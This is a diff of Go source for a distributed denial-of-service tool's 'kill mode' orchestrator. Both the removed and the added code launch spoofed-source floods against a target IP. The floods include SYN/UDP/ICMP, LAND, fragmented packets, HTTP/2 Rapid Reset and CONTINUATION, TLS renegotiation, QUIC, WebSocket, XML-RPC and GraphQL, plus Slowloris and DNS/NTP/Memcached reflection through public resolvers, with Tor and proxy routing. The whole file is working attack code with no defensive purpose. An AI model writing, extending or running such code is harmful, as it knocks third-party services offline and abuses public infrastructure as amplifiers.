@@ -5,112 +5,57 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
-	"net/http"
-	"strconv"
-	"strings"
-	"sync"
 	"sync/atomic"
 	"time"
 )
 
 type KillOrchestrator struct {
-	cfg          *AttackConfig
-	status       chan<- WorkerStats
-	stopFlg      int32
-	totalSent    int64
-	rttMs        int64
-	blockedFlg   int32
-	openPorts    []int
-	spoofU32     []uint32
+	cfg    *AttackConfig
+	status chan<- WorkerStats
+	stop   int32
 }
+
+type GoroutineCounter struct{ count int32 }
+
+func (g *GoroutineCounter) Add() int32   { return atomic.AddInt32(&g.count, 1) }
+func (g *GoroutineCounter) Done() int32   { return atomic.AddInt32(&g.count, -1) }
+func (g *GoroutineCounter) Load() int32   { return atomic.LoadInt32(&g.count) }
+func (g *GoroutineCounter) Set(n int32) { atomic.StoreInt32(&g.count, n) }
 
 func NewKillOrchestrator(cfg *AttackConfig, status chan<- WorkerStats) *KillOrchestrator {
-	return &KillOrchestrator{
-		cfg:    cfg,
-		status: status,
-	}
+	return &KillOrchestrator{cfg: cfg, status: status}
 }
 
-func (k *KillOrchestrator) Stop() {
-	atomic.StoreInt32(&k.stopFlg, 1)
-}
+func (ko *KillOrchestrator) Stop()         { atomic.StoreInt32(&ko.stop, 1) }
+func (ko *KillOrchestrator) stopped() bool { return atomic.LoadInt32(&ko.stop) != 0 }
 
-func (k *KillOrchestrator) stopped() bool {
-	return atomic.LoadInt32(&k.stopFlg) != 0
-}
-
-func parseMix(ratio string) (udpPct, synPct, httpPct, ampPct int) {
-	parts := strings.Split(ratio, ":")
-	if len(parts) < 4 {
-		return 25, 25, 25, 25
-	}
-	vals := make([]int, 4)
-	for i := 0; i < 4 && i < len(parts); i++ {
-		v, err := strconv.Atoi(strings.TrimSpace(parts[i]))
-		if err != nil || v < 0 {
-			v = 25
+func (ko *KillOrchestrator) Run(done chan<- struct{}) {
+	defer func() {
+		if r := recover(); r != nil {
+			errf(`{"type":"recover","message":"kill mode panic: %v"}`+"\n", r)
 		}
-		vals[i] = v
-	}
-	total := vals[0] + vals[1] + vals[2] + vals[3]
-	if total == 0 {
-		return 25, 25, 25, 25
-	}
-	return vals[0], vals[1], vals[2], vals[3]
-}
+	}()
 
-func (k *KillOrchestrator) scanCommonPorts(target string) []int {
-	ports := []int{21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
-		1433, 1521, 2049, 3306, 3389, 5432, 5900, 5985, 6379, 8080, 8443, 9000, 9200, 27017}
-	var mu sync.Mutex
-	var open []int
-	var wg sync.WaitGroup
-	for _, p := range ports {
-		wg.Add(1)
-		go func(port int) {
-			defer wg.Done()
-			conn, err := net.DialTimeout("tcp", net.JoinHostPort(target, fmt.Sprintf("%d", port)), 500*time.Millisecond)
-			if err == nil {
-				conn.Close()
-				mu.Lock()
-				open = append(open, port)
-				mu.Unlock()
-			}
-		}(p)
+	err := InitEngine()
+	if err != nil {
+		errf(`{"type":"error","message":"init engine: %v"}`+"\n", err)
+		done <- struct{}{}
+		return
 	}
-	wg.Wait()
-	return open
-}
+	defer CloseEngine()
 
-func (k *KillOrchestrator) Run(done chan<- struct{}) {
-	defer func() { done <- struct{}{} }()
+	targetIP := ko.cfg.Target
+	targetPort := ko.cfg.Port
+	duration := ko.cfg.Duration
+	workers := ko.cfg.Workers
+	if workers < 10 { workers = 512 }
+	if workers > 4096 { workers = 4096 }
+	size := ko.cfg.Size
+	if size < 64 { size = 65000 }
 
-	udpPct, synPct, httpPct, ampPct := parseMix(k.cfg.MixRatio)
-	total := udpPct + synPct + httpPct + ampPct
-	if total == 0 {
-		udpPct, synPct, httpPct, ampPct = 25, 25, 25, 25
-		total = 100
-	}
-
-	maxWorkers := 128
-	workers := k.cfg.Workers
-	if workers > maxWorkers {
-		workers = maxWorkers
-	}
-	if workers < 16 {
-		workers = 16
-	}
-
-	udpW := max(1, workers*udpPct/total)
-	synW := max(1, workers*synPct/total)
-	httpW := max(1, workers*httpPct/total)
-	ampW := max(1, workers*ampPct/total)
-
-	targetIP := k.cfg.Target
-	targetPort := k.cfg.Port
-	spoofPool := k.cfg.SpoofPool
+	spoofPool := ko.cfg.SpoofPool
 	if len(spoofPool) == 0 {
-		spoofPool = make([]string, 100)
+		spoofPool = make([]string, 200)
 		for i := range spoofPool {
 			spoofPool[i] = randIP()
 		}
@@ -119,266 +64,339 @@ func (k *KillOrchestrator) Run(done chan<- struct{}) {
 	for i, s := range spoofPool {
 		spoofU32[i] = parseSpoof(s)
 	}
-	k.spoofU32 = spoofU32
 	SetSpoofPool(spoofU32)
 
-	k.openPorts = k.scanCommonPorts(targetIP)
-	if len(k.openPorts) == 0 {
-		k.openPorts = []int{targetPort}
-	}
-	attackPorts := k.openPorts
-	if len(attackPorts) > 8 {
-		attackPorts = attackPorts[:8]
-	}
-	duration := k.cfg.Duration
-	if duration < 1 {
-		duration = 30
-	}
-
-	var wg sync.WaitGroup
-
-	// Start high-throughput C batch floods for L3/L4 vectors
-	// They will run for the full duration internally
-	batchWorkers := min(128, workers)
-	for _, p := range attackPorts[:min(3, len(attackPorts))] {
-		port := p
-		if synW > 0 {
-			StartBatchFlood(targetIP, port, 0, batchWorkers/3, 0, duration)
-		}
-		if udpW > 0 {
-			StartBatchFlood(targetIP, port, 1, batchWorkers/3, 1024, duration)
-		}
-		if synW > 0 {
-			StartBatchFlood(targetIP, port, 2, batchWorkers/4, 0, duration)
-		}
-		_ = port
-	}
-
-	// ICMP separate workers
-	if synW > 0 {
-		for i := 0; i < 16; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				for !k.stopped() {
-					spoof := spoofPool[rand.Intn(len(spoofPool))]
-					SendICMP(targetIP, spoof)
-					atomic.AddInt64(&k.totalSent, 1)
-				}
-			}()
+	ratios := parseMixRatio(ko.cfg.MixRatio)
+	methods := []string{"l4", "http", "slowloris", "amp"}
+	pcts := make([]int, len(methods))
+	for i, m := range methods {
+		if p, ok := ratios[m]; ok {
+			pcts[i] = p
 		}
 	}
 
-	// Amplification workers (DNS + Memcached on reflectors)
-	reflectors := []string{"8.8.8.8", "1.1.1.1", "208.67.222.222", "8.8.4.4", "9.9.9.9",
-		"64.6.64.6", "208.67.220.220", "4.2.2.1", "4.2.2.2", "4.2.2.3"}
-	if ampW > 0 {
-		for _, ref := range reflectors[:8] {
-			reflector := ref
-			wg.Add(2)
-			go func() {
-				defer wg.Done()
-				for !k.stopped() {
-					spoof := spoofPool[rand.Intn(len(spoofPool))]
-					DNSAnyAmp(targetIP, spoof, reflector)
-					atomic.AddInt64(&k.totalSent, 1)
-				}
-			}()
-			go func() {
-				defer wg.Done()
-				for !k.stopped() {
-					spoof := spoofPool[rand.Intn(len(spoofPool))]
-					MemcachedAmp(targetIP, spoof, reflector)
-					atomic.AddInt64(&k.totalSent, 1)
-				}
-			}()
-		}
+	deadline := time.Now().Add(time.Duration(duration) * time.Second)
+	var pool GoroutineCounter
+
+	/* L4 attack: batch C-flood + raw goroutines */
+	if pcts[0] > 0 {
+		l4workers := workers * pcts[0] / 100
+		if l4workers < 1 { l4workers = 64 }
+		ko.runL4(targetIP, targetPort, size, l4workers, duration, spoofPool, &pool, deadline)
 	}
 
-	// Application layer: HTTP + HTTPS on attack ports
-	if httpW > 0 {
-		for _, p := range attackPorts {
-			port := p
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				flooder := NewHTTPFlooder()
-				proxyList := k.cfg.ProxyList
-				if len(proxyList) == 0 && k.cfg.TorProxy != "" {
-					proxyList = []string{k.cfg.TorProxy}
-				}
-				go flooder.RunKill(k.cfg.Target, port, httpW,
-					k.cfg.RateLimit, duration, proxyList, k.cfg.Jitter, k.status)
-				// Wait for orchestrator stop signal, then stop flooder
-				for !k.stopped() {
-					time.Sleep(1 * time.Second)
-				}
-				flooder.Stop()
-			}()
-		}
+	/* HTTP flood */
+	if pcts[1] > 0 {
+		httpWorkers := workers * pcts[1] / 100
+		if httpWorkers < 1 { httpWorkers = 16 }
+		ko.runHTTPKill(targetIP, targetPort, httpWorkers, duration, spoofPool, &pool, deadline)
 	}
 
-	// H2 Rapid Reset on HTTPS ports — exhausts HTTP/2 stream table
-	if contains(attackPorts, 443) || contains(attackPorts, 8443) {
-		for i := 0; i < 12; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				for !k.stopped() {
-					spoof := spoofPool[rand.Intn(len(spoofPool))]
-					H2RapidReset(targetIP, 443, spoof, 500)
-					atomic.AddInt64(&k.totalSent, 500)
-				}
-			}()
-		}
+	/* Slowloris */
+	if pcts[2] > 0 {
+		slowWorkers := workers * pcts[2] / 100
+		if slowWorkers < 1 { slowWorkers = 50 }
+		ko.runSlowloris(targetIP, targetPort, slowWorkers, duration, spoofPool, &pool, deadline)
 	}
 
-	// SSL renegotiation — tries to exhaust server SSL session cache
-	if contains(attackPorts, 443) {
-		for i := 0; i < 24; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				for !k.stopped() {
-					conn, err := tls.Dial("tcp", net.JoinHostPort(targetIP, "443"),
-						&tls.Config{InsecureSkipVerify: true, MaxVersion: tls.VersionTLS12})
-					if err != nil {
-						continue
-					}
-					conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + targetIP + "\r\nConnection: keep-alive\r\n\r\n"))
-					conn.Close()
-					atomic.AddInt64(&k.totalSent, 1)
-				}
-			}()
-		}
+	/* Amplification */
+	if pcts[3] > 0 {
+		ampWorkers := workers * pcts[3] / 100
+		if ampWorkers < 1 { ampWorkers = 32 }
+		ko.runAmp(targetIP, targetPort, ampWorkers, duration, spoofPool, &pool, deadline)
 	}
 
-	// Slowloris on HTTP ports — hold connections open, exhaust connection pool
-	for _, p := range attackPorts {
-		if p == 443 || p == 8443 {
-			continue
-		}
-		port := p
-		for i := 0; i < 6; i++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				for !k.stopped() {
-					conn, err := net.DialTimeout("tcp", net.JoinHostPort(targetIP, fmt.Sprintf("%d", port)), 5*time.Second)
-					if err != nil {
-						continue
-					}
-					conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + targetIP + "\r\nUser-Agent: Mozilla/5.0\r\n"))
-					for i := 0; i < 60; i++ {
-						if k.stopped() {
-							conn.Close()
-							return
-						}
-						conn.Write([]byte(fmt.Sprintf("X-%d: %s\r\n", i, randStr(128))))
-						time.Sleep(3 * time.Second)
-					}
-					conn.Close()
-					atomic.AddInt64(&k.totalSent, 1)
-				}
-			}()
-		}
-	}
-
-	// RTT monitor goroutine
-	var rttWG sync.WaitGroup
-	rttWG.Add(1)
-	go func() {
-		defer rttWG.Done()
-		client := &http.Client{
-			Timeout: 2 * time.Second,
-			Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
-		}
-		scheme := "http"
-		port := targetPort
-		for _, p := range k.openPorts {
-			if p == 443 {
-				scheme = "https"
-				port = 443
-				break
-			}
-		}
-		url := fmt.Sprintf("%s://%s:%d/", scheme, targetIP, port)
-		for !k.stopped() {
-			t0 := time.Now()
-			resp, err := client.Get(url)
-			if err != nil {
-				atomic.StoreInt64(&k.rttMs, 999)
-				time.Sleep(1 * time.Second)
-				continue
-			}
-			lat := int64(time.Since(t0).Milliseconds())
-			atomic.StoreInt64(&k.rttMs, lat)
-			if resp.StatusCode == 403 || resp.StatusCode == 429 || resp.StatusCode == 503 {
-				atomic.StoreInt32(&k.blockedFlg, 1)
-			} else {
-				atomic.StoreInt32(&k.blockedFlg, 0)
-			}
-			resp.Body.Close()
-			time.Sleep(3 * time.Second)
-		}
-	}()
-
-	// Track total across ALL sources (batch + goroutines + HTTP)
-	go func() {
-		ticker := time.NewTicker(1 * time.Second)
-		defer ticker.Stop()
-		var prevBatch int64 = 0
-		for !k.stopped() {
-			select {
-			case <-ticker.C:
-				batchSent := int64(BatchFloodSent())
-				diff := batchSent - prevBatch
-				if diff < 0 { diff = batchSent }
-				prevBatch = batchSent
-				goroSent := atomic.SwapInt64(&k.totalSent, 0)
-				total := diff + goroSent
-				rtt := atomic.LoadInt64(&k.rttMs)
-				method := "KILL"
-				if k.blocked() {
-					method = "KILL(BACKOFF)"
-				} else if rtt > 0 && rtt < 999 {
-					method = fmt.Sprintf("KILL-%dms", rtt)
-				}
-				k.status <- WorkerStats{
-					Sent:   total,
-					Active: workers * len(attackPorts),
-					Rate:   int(total),
-					Method: method,
-				}
-			}
-		}
-	}()
-
-	// Main loop — sleep until done
-	startTime := time.Now()
-	for {
-		if k.stopped() {
-			break
-		}
-		elapsed := int(time.Since(startTime).Seconds())
-		if elapsed >= duration {
-			break
-		}
-		time.Sleep(500 * time.Millisecond)
-	}
-	atomic.StoreInt32(&k.stopFlg, 1)
+	/* Wait for deadline, then stop */
+	time.Sleep(time.Until(deadline))
 	StopBatchFlood()
-	wg.Wait()
-	rttWG.Wait()
+	done <- struct{}{}
 }
 
-func (k *KillOrchestrator) blocked() bool {
-	return atomic.LoadInt32(&k.blockedFlg) != 0
+func (ko *KillOrchestrator) runL4(targetIP string, targetPort int, size, workers, duration int, spoofPool []string, pool *GoroutineCounter, deadline time.Time) {
+	_ = StartBatchFlood(targetIP, targetPort, 0, workers, size, duration)
+
+	for i := 0; i < workers && i < 1024; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			for time.Now().Before(deadline) && !ko.stopped() {
+				spoof := spoofPool[rand.Intn(len(spoofPool))]
+				SendSYN(targetIP, targetPort, spoof)
+				SendUDP(targetIP, targetPort, spoof, size)
+				SendACK(targetIP, targetPort, spoof)
+				SendRST(targetIP, targetPort, spoof)
+			}
+		}()
+	}
+
+	/* ICMP storm */
+	for i := 0; i < 64; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			for time.Now().Before(deadline) && !ko.stopped() {
+				spoof := spoofPool[rand.Intn(len(spoofPool))]
+				SendICMP(targetIP, spoof)
+			}
+		}()
+	}
+
+	/* Fragmented flood */
+	for i := 0; i < 32; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			for time.Now().Before(deadline) && !ko.stopped() {
+				spoof := spoofPool[rand.Intn(len(spoofPool))]
+				SendFragmentedSYN(targetIP, targetPort, spoof)
+				SendFragmentedUDP(targetIP, targetPort, spoof, size)
+			}
+		}()
+	}
+
+	/* Stateful bypass flood */
+	for i := 0; i < 64; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			for time.Now().Before(deadline) && !ko.stopped() {
+				StatefulBypassFlood(targetIP, targetPort, spoofPool[rand.Intn(len(spoofPool))])
+			}
+		}()
+	}
+
+	/* LAND attack */
+	for i := 0; i < 16; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			for time.Now().Before(deadline) && !ko.stopped() {
+				SendLAND(targetIP, targetPort)
+			}
+		}()
+	}
+
+	/* H2 Rapid Reset */
+	for i := 0; i < 32; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			for time.Now().Before(deadline) && !ko.stopped() {
+				spoof := spoofPool[rand.Intn(len(spoofPool))]
+				H2RapidReset(targetIP, targetPort, spoof, 256)
+			}
+		}()
+	}
+
+	/* H2 CONTINUATION flood (CVE-2024-27316) */
+	for i := 0; i < 16; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			for time.Now().Before(deadline) && !ko.stopped() {
+				spoof := spoofPool[rand.Intn(len(spoofPool))]
+				spU32 := parseSpoof(spoof)
+				H2ContinuationFlood(parseSpoof(targetIP), uint16(targetPort), spU32, 500, 10)
+			}
+		}()
+	}
+
+	/* TLS Renegotiation flood */
+	for i := 0; i < 16; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
+			for time.Now().Before(deadline) && !ko.stopped() {
+				tcpConn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+				if err != nil {
+					continue
+				}
+				tlsConn := tls.Client(tcpConn, &tls.Config{
+					InsecureSkipVerify: true,
+					MaxVersion:         tls.VersionTLS13,
+					CipherSuites:       []uint16{tls.TLS_AES_128_GCM_SHA256},
+				})
+				if err := tlsConn.Handshake(); err != nil {
+					tcpConn.Close()
+					continue
+				}
+				for attempt := 0; attempt < 100; attempt++ {
+					if time.Now().After(deadline) || ko.stopped() {
+						break
+					}
+					ch := buildFakeClientHello()
+					if _, err := tcpConn.Write(ch); err != nil {
+						break
+					}
+				}
+				tlsConn.Close()
+				tcpConn.Close()
+			}
+		}()
+	}
+
+	/* QUIC/HTTP3 flood */
+	for i := 0; i < 32; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
+			raddr, err := net.ResolveUDPAddr("udp", addr)
+			if err != nil { return }
+			conn, err := net.DialUDP("udp", nil, raddr)
+			if err != nil { return }
+			defer conn.Close()
+			for time.Now().Before(deadline) && !ko.stopped() {
+				pkt := buildQUICInitial()
+				conn.Write(pkt)
+			}
+		}()
+	}
+
+	/* gRPC unary flood */
+	for i := 0; i < 32; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
+			for time.Now().Before(deadline) && !ko.stopped() {
+				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+				if err != nil { continue }
+				conn.Write(buildGRPCUnaryFrame())
+				conn.Close()
+			}
+		}()
+	}
+
+	/* WebSocket connect+ping flood */
+	for i := 0; i < 32; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
+			for time.Now().Before(deadline) && !ko.stopped() {
+				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+				if err != nil { continue }
+				key := randStr(16)
+				upgrade := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s==\r\nSec-WebSocket-Version: 13\r\n\r\n", addr, key)
+				conn.Write([]byte(upgrade))
+				maskKey := []byte{byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256)), byte(rand.Intn(256))}
+				payload := make([]byte, 64)
+				for j := range payload { payload[j] = byte(rand.Intn(256)) }
+				for i := 0; i < 100; i++ {
+					if time.Now().After(deadline) || ko.stopped() { break }
+					frame := buildWSPing(maskKey, payload)
+					if _, err := conn.Write(frame); err != nil { break }
+				}
+				conn.Close()
+			}
+		}()
+	}
+
+	/* WordPress XML-RPC + GraphQL flood */
+	for i := 0; i < 32; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			addr := fmt.Sprintf("%s:%d", targetIP, targetPort)
+			xmlPayload := `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://example.com/</string></value></param><param><value><string>http://` + targetIP + `/</string></value></param></params></methodCall>`
+			graphqlPayload := `{"query":"query { __schema { types { name fields { name } } } }"}`
+			for time.Now().Before(deadline) && !ko.stopped() {
+				conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+				if err != nil { continue }
+				xmlReq := fmt.Sprintf("POST /xmlrpc.php HTTP/1.1\r\nHost: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n%s", targetIP, len(xmlPayload), xmlPayload)
+				conn.Write([]byte(xmlReq))
+				conn.Close()
+
+				conn2, err := net.DialTimeout("tcp", addr, 5*time.Second)
+				if err != nil { continue }
+				gqlReq := fmt.Sprintf("POST /graphql HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s", targetIP, len(graphqlPayload), graphqlPayload)
+				conn2.Write([]byte(gqlReq))
+				conn2.Close()
+			}
+		}()
+	}
 }
 
-var letters = []byte("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
+func (ko *KillOrchestrator) runHTTPKill(targetIP string, targetPort int, workers, duration int, spoofPool []string, pool *GoroutineCounter, deadline time.Time) {
+	flooder := NewHTTPFlooder()
+	proxyList := ko.cfg.ProxyList
+	if len(proxyList) == 0 && ko.cfg.TorProxy != "" {
+		proxyList = []string{ko.cfg.TorProxy}
+	}
+	go flooder.RunKill(targetIP, targetPort, workers, 999999999, duration, proxyList, 0, ko.status)
+	pool.Add()
+	go func() {
+		defer pool.Done()
+		time.Sleep(time.Until(deadline))
+		flooder.Stop()
+	}()
+}
+
+func (ko *KillOrchestrator) runSlowloris(targetIP string, targetPort int, workers, duration int, spoofPool []string, pool *GoroutineCounter, deadline time.Time) {
+	for i := 0; i < workers; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			for time.Now().Before(deadline) && !ko.stopped() {
+				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), 5*time.Second)
+				if err != nil { continue }
+				conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + targetIP + "\r\nUser-Agent: Mozilla/5.0\r\n"))
+				for time.Now().Before(deadline) && !ko.stopped() {
+					conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+					_, err := conn.Write([]byte("X-a: " + randStr(128) + "\r\n"))
+					if err != nil { break }
+					time.Sleep(100 * time.Millisecond)
+				}
+				conn.Close()
+			}
+		}()
+	}
+}
+
+func (ko *KillOrchestrator) runAmp(targetIP string, targetPort int, workers, duration int, spoofPool []string, pool *GoroutineCounter, deadline time.Time) {
+	/* Initialize amplification bank with all 11 protocols */
+	tip := parseSpoof(targetIP)
+	AmpBankInit(tip, uint16(targetPort))
+
+	/* Spawn workers using amp_bank — random protocol per packet, batched sendmmsg */
+	for i := 0; i < workers; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			AmpBankFloodAll(99999999)
+		}()
+	}
+
+	/* Also keep legacy individual server-based amplification for variety */
+	dnsServers := []string{"8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"}
+	ntpServers := []string{"pool.ntp.org", "time.google.com"}
+	memcachedServers := []string{"1.2.3.4"}
+
+	for i := 0; i < workers/2; i++ {
+		pool.Add()
+		go func() {
+			defer pool.Done()
+			for time.Now().Before(deadline) && !ko.stopped() {
+				spoof := spoofPool[rand.Intn(len(spoofPool))]
+				switch rand.Intn(4) {
+				case 0:
+					SendDNSAmp(targetIP, spoof, dnsServers[rand.Intn(len(dnsServers))])
+				case 1:
+					SendNTPAmp(targetIP, spoof, ntpServers[rand.Intn(len(ntpServers))])
+				case 2:
+					MemcachedAmp(targetIP, spoof, memcachedServers[rand.Intn(len(memcachedServers))])
+				case 3:
+					AmpBankFloodAll(1000)
+				}
+			}
+		}()
+	}
+}
 
 func randStr(n int) string {
+	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	b := make([]byte, n)
 	for i := range b {
 		b[i] = letters[rand.Intn(len(letters))]
@@ -386,25 +404,19 @@ func randStr(n int) string {
 	return string(b)
 }
 
-func max(a, b int) int {
-	if a > b {
-		return a
-	}
-	return b
-}
-
-func min(a, b int) int {
-	if a < b {
-		return a
-	}
-	return b
-}
-
-func contains(slice []int, val int) bool {
-	for _, v := range slice {
-		if v == val {
-			return true
+func parseMixRatio(ratio string) map[string]int {
+	result := map[string]int{"l4": 25, "http": 25, "slowloris": 25, "amp": 25}
+	if ratio == "" { return result }
+	var l4, http, slow, amp int
+	n, _ := fmt.Sscanf(ratio, "%d:%d:%d:%d", &l4, &http, &slow, &amp)
+	if n == 4 {
+		total := l4 + http + slow + amp
+		if total > 0 {
+			result["l4"] = l4
+			result["http"] = http
+			result["slowloris"] = slow
+			result["amp"] = amp
 		}
 	}
-	return false
+	return result
 }
